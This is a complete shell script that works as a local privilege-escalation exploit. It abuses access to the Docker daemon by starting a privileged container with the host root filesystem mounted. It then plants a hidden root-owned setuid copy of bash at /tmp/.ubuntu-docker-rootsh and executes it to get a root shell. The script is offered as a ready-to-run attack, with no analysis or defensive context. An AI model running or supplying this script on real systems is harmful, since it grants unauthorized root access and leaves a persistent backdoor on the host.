#!/bin/sh
set -eu

target="${1:-/tmp/.ubuntu-docker-rootsh}"
host_shell="${HOST_SHELL:-}"

case "$target" in
  /*) ;;
  *) echo "usage: $0 [/absolute/output/path]" >&2; exit 1 ;;
esac

if [ -z "$host_shell" ]; then
  if [ -x /bin/bash ]; then
    host_shell=/bin/bash
  elif [ -x /usr/bin/bash ]; then
    host_shell=/usr/bin/bash
  else
    host_shell=/bin/sh
  fi
fi

case "$host_shell" in
  /*) ;;
  *) echo "HOST_SHELL must be an absolute path" >&2; exit 1 ;;
esac

if ! command -v docker >/dev/null 2>&1; then
  echo "docker client not found" >&2
  exit 1
fi

if ! docker info >/dev/null 2>&1; then
  echo "docker daemon is not reachable by this user" >&2
  exit 1
fi

image="${DOCKER_IMAGE:-}"
if [ -z "$image" ]; then
  image="$(docker image ls --format '{{.Repository}}:{{.Tag}}' | awk '$1 !~ /^<none>/ { print; exit }')"
fi
if [ -z "$image" ]; then
  image=alpine:latest
fi

docker run --rm --privileged -v /:/host \
  -e TARGET="$target" \
  -e HOST_SHELL="$host_shell" \
  "$image" sh -eu -c '
    mkdir -p "/host$(dirname "$TARGET")"
    rm -f "/host$TARGET"
    cp "/host$HOST_SHELL" "/host$TARGET"
    chown 0:0 "/host$TARGET"
    chmod 4755 "/host$TARGET"
  '

exec "$target" -p
